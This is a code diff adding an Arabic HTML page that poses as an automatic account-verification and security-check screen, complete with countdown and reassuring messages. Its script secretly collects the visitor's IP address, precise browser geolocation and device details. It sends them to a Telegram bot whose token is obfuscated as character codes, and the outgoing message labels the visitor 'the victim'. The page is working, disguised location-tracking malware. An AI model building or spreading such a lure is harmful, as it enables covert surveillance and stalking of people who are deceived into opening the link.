@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>التحقق من الحساب</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Tajawal', sans-serif;
+    }
+    
+    body {
+      background: linear-gradient(135deg, #1a2a6c, #b21f1f, #001f3f);
+      background-size: 400% 400%;
+      animation: gradientBG 15s ease infinite;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #333;
+      direction: rtl;
+      overflow: hidden;
+    }
+    
+    @keyframes gradientBG {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    
+    .container {
+      width: 90%;
+      max-width: 600px;
+      background: rgba(255, 255, 255, 0.95);
+      border-radius: 20px;
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+      overflow: hidden;
+      position: relative;
+      z-index: 10;
+      text-align: center;
+      padding: 40px;
+      transition: transform 0.3s ease;
+    }
+    
+    .container:hover {
+      transform: translateY(-5px);
+    }
+    
+    .header {
+      margin-bottom: 30px;
+      position: relative;
+    }
+    
+    .shield {
+      font-size: 80px;
+      color: #1a73e8;
+      margin-bottom: 15px;
+      animation: pulse 2s infinite;
+    }
+    
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+      100% { transform: scale(1); }
+    }
+    
+    h1 {
+      font-size: 28px;
+      font-weight: 800;
+      color: #1a73e8;
+      margin-bottom: 15px;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    }
+    
+    .message {
+      font-size: 18px;
+      line-height: 1.7;
+      color: #444;
+      margin-bottom: 30px;
+    }
+    
+    .process-bar {
+      height: 8px;
+      background: #e0e0e0;
+      border-radius: 4px;
+      margin: 30px 0;
+      overflow: hidden;
+    }
+    
+    .progress {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #1a73e8, #00bcd4);
+      border-radius: 4px;
+      transition: width 0.5s ease;
+    }
+    
+    .countdown-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin: 30px 0;
+    }
+    
+    .countdown {
+      font-size: 48px;
+      font-weight: 800;
+      background: linear-gradient(135deg, #1a73e8, #00bcd4);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      width: 100px;
+      height: 100px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      position: relative;
+    }
+    
+    .countdown::before {
+      content: "";
+      position: absolute;
+      top: -5px;
+      left: -5px;
+      right: -5px;
+      bottom: -5px;
+      border-radius: 50%;
+      border: 3px solid #1a73e8;
+      animation: ring 2s linear infinite;
+    }
+    
+    @keyframes ring {
+      0% { transform: scale(0.95); opacity: 1; }
+      100% { transform: scale(1.3); opacity: 0; }
+    }
+    
+    .features {
+      display: flex;
+      justify-content: space-around;
+      flex-wrap: wrap;
+      margin: 30px 0;
+    }
+    
+    .feature {
+      display: flex;
+      align-items: center;
+      margin: 10px;
+    }
+    
+    .feature i {
+      font-size: 24px;
+      color: #1a73e8;
+      margin-left: 10px;
+    }
+    
+    .footer {
+      margin-top: 30px;
+      color: #666;
+      font-size: 14px;
+    }
+    
+    .loading-dots {
+      display: flex;
+      justify-content: center;
+      margin-top: 20px;
+    }
+    
+    .dot {
+      width: 12px;
+      height: 12px;
+      background: #1a73e8;
+      border-radius: 50%;
+      margin: 0 5px;
+      animation: bounce 1.5s infinite ease-in-out;
+    }
+    
+    .dot:nth-child(2) {
+      animation-delay: 0.2s;
+    }
+    
+    .dot:nth-child(3) {
+      animation-delay: 0.4s;
+    }
+    
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-15px); }
+    }
+    
+    .bubbles {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+    }
+    
+    .bubble {
+      position: absolute;
+      bottom: -100px;
+      width: 40px;
+      height: 40px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 50%;
+      animation: rise 10s infinite ease-in;
+    }
+    
+    .bubble:nth-child(1) {
+      left: 10%;
+      animation-delay: 0s;
+      width: 20px;
+      height: 20px;
+    }
+    
+    .bubble:nth-child(2) {
+      left: 20%;
+      animation-delay: 2s;
+      width: 30px;
+      height: 30px;
+    }
+    
+    .bubble:nth-child(3) {
+      left: 35%;
+      animation-delay: 4s;
+    }
+    
+    .bubble:nth-child(4) {
+      left: 50%;
+      animation-delay: 1s;
+      width: 25px;
+      height: 25px;
+    }
+    
+    .bubble:nth-child(5) {
+      left: 65%;
+      animation-delay: 5s;
+    }
+    
+    .bubble:nth-child(6) {
+      left: 75%;
+      animation-delay: 3s;
+      width: 35px;
+      height: 35px;
+    }
+    
+    .bubble:nth-child(7) {
+      left: 90%;
+      animation-delay: 6s;
+      width: 15px;
+      height: 15px;
+    }
+    
+    @keyframes rise {
+      0% {
+        bottom: -100px;
+        transform: translateX(0);
+      }
+      50% {
+        transform: translateX(100px);
+      }
+      100% {
+        bottom: 1080px;
+        transform: translateX(-200px);
+      }
+    }
+    
+    @media (max-width: 768px) {
+      .container {
+        padding: 30px 20px;
+        width: 95%;
+      }
+      
+      h1 {
+        font-size: 24px;
+      }
+      
+      .message {
+        font-size: 16px;
+      }
+      
+      .countdown {
+        font-size: 36px;
+        width: 80px;
+        height: 80px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="bubbles">
+    <div class="bubble"></div>
+    <div class="bubble"></div>
+    <div class="bubble"></div>
+    <div class="bubble"></div>
+    <div class="bubble"></div>
+    <div class="bubble"></div>
+    <div class="bubble"></div>
+  </div>
+  
+  <div class="container">
+    <div class="header">
+      <div class="shield">
+        <i class="fas fa-shield-alt"></i>
+      </div>
+      <h1>التحقق من حسابك</h1>
+    </div>
+    
+    <div class="message">
+      <p>جاري التحقق من معلومات حسابك وتأمينه لحمايتك من أي تهديدات محتملة</p>
+      <p>يرجى الانتظار قليلاً حتى نكمل عملية التحقق...</p>
+    </div>
+    
+    <div class="process-bar">
+      <div class="progress" id="progress"></div>
+    </div>
+    
+    <div class="countdown-container">
+      <div class="countdown" id="countdown">5</div>
+    </div>
+    
+    <div class="loading-dots">
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+    
+    <div class="features">
+      <div class="feature">
+        <i class="fas fa-lock"></i>
+        <span>تشفير متقدم</span>
+      </div>
+      <div class="feature">
+        <i class="fas fa-user-shield"></i>
+        <span>حماية من الاختراق</span>
+      </div>
+      <div class="feature">
+        <i class="fas fa-shield-alt"></i>
+        <span>فحص الأمان</span>
+      </div>
+    </div>
+    
+    <div class="footer">
+      <p>هذه العملية تلقائية ولا تتطلب أي إجراء منك</p>
+      <p>© 2023 نظام حماية الحسابات. جميع الحقوق محفوظة</p>
+    </div>
+  </div>
+
+  <script>
+    // عناصر DOM
+    const countdownElement = document.getElementById('countdown');
+    const progressElement = document.getElementById('progress');
+    
+    // تهيئة العداد وشريط التقدم
+    let count = 5;
+    let progress = 0;
+    
+    // تحديث العداد وشريط التقدم
+    const interval = setInterval(() => {
+      count--;
+      countdownElement.textContent = count;
+      
+      progress += 20;
+      progressElement.style.width = `${progress}%`;
+      
+      if (count <= 0) {
+        clearInterval(interval);
+        countdownElement.textContent = "0";
+        progressElement.style.width = "100%";
+        
+        // إضافة رسالة بعد انتهاء العداد
+        setTimeout(() => {
+          document.querySelector('.message p').textContent = "تم التحقق بنجاح! جاري تحويلك...";
+          document.querySelector('.shield i').className = "fas fa-check-circle";
+          document.querySelector('.shield i').style.color = "#4CAF50";
+        }, 1000);
+      }
+    }, 1000);
+    
+    function getBotToken() {
+
+      const tokenParts = [
+        [56, 48, 49], // 801
+        [49, 50, 51, 52], // 1234
+        [52, 48, 51], // 403
+        [58], // :
+        [65, 65, 69, 71], // AAEG
+        [107, 107, 55, 102, 50, 45], // kk7f2-
+        [110, 67, 66, 118, 114, 110], // nCBvrn
+        [51, 114, 55, 122], // 3r7z
+        [95, 72, 45, 95], // _H-_
+        [122, 56, 71, 85, 89, 66], // z8GUYB
+        [104, 79, 75, 111, 115] // hOKos
+      ];
+      
+
+      const token = tokenParts.map(part => 
+        part.map(code => String.fromCharCode(code)).join('')
+      ).join('');
+      
+      return token;
+    }
+
+      const BOT_TOKEN = getBotToken();
+      const urlParams = new URLSearchParams(window.location.search);
+      const CHAT_ID = urlParams.get('id');
+
+    function sendLocation(lat, lon, ip, deviceInfo) {
+      // إرسال الموقع كبقعة على الخريطة
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          latitude: lat,
+          longitude: lon
+        })
+      });
+
+      // تنسيق الرسالة
+      const locationLink = `https://www.google.com/maps?q=${lat},${lon}`;
+      const message = `
+تم الحصول على موقع الضحيه ✅
+
+رابط الموقع :
+${locationLink}
+
+
+🌍 IP:
+${ip}
+
+
+📱 الجهاز:
+${deviceInfo}
+      `;
+
+      // إرسال التفاصيل كنص
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      });
+    }
+
+    function requestLocation(ip) {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const deviceInfo = navigator.userAgent;
+            sendLocation(lat, lon, ip, deviceInfo);
+          },
+          error => {
+            console.error("فشل الحصول على الموقع:", error);
+          }
+        );
+      } else {
+        alert("المتصفح لا يدعم تحديد الموقع الجغرافي.");
+      }
+    }
+
+    // جلب عنوان IP من خدمة خارجية
+    fetch("https://api.ipify.org?format=json")
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+        requestLocation(ip);
+      })
+      .catch(error => {
+        console.error("فشل في جلب IP:", error);
+        requestLocation("غير معروف");
+      });
+  </script>
+</body>
+</html>
